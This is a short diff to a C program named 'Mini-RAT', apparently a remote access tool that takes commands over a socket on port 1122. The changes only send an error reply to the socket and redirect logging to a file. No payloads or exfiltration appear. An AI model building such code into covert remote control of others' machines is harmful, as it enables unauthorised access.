@@ -146,7 +146,7 @@ void parse_cmd(int sock, char *line) {
         } else if (strlen(argv[0]) == 0) {
                 // Do nothing
         } else {
-                printf("Invalid command\n");
+                dprintf(sock, "Invalid command\n");
         }
         free(argv);
         return;
@@ -174,8 +174,9 @@ int main(int argc, char* argv[]) {
         sigaction(SIGTERM, &action, NULL);
         sigaction(SIGHUP, &action, NULL);
 
-        //FILE *logfile = fopen("log.txt", "w");
-        init_logging(stderr);
+        FILE *logfile = fopen("log.txt", "w");
+        init_logging(logfile);
+
         uint16_t port = 1122;
         pthread_t listen_thread;
         pthread_create(&listen_thread, NULL, listener, (void*)&port);
@@ -191,5 +192,6 @@ int main(int argc, char* argv[]) {
         log_msg(LOG_INFO, "Mini-RAT shutting down\n");
         pthread_cancel(listen_thread);
         pthread_cancel(clisten_thread);
+        close_logfile();
         return 0;
 }
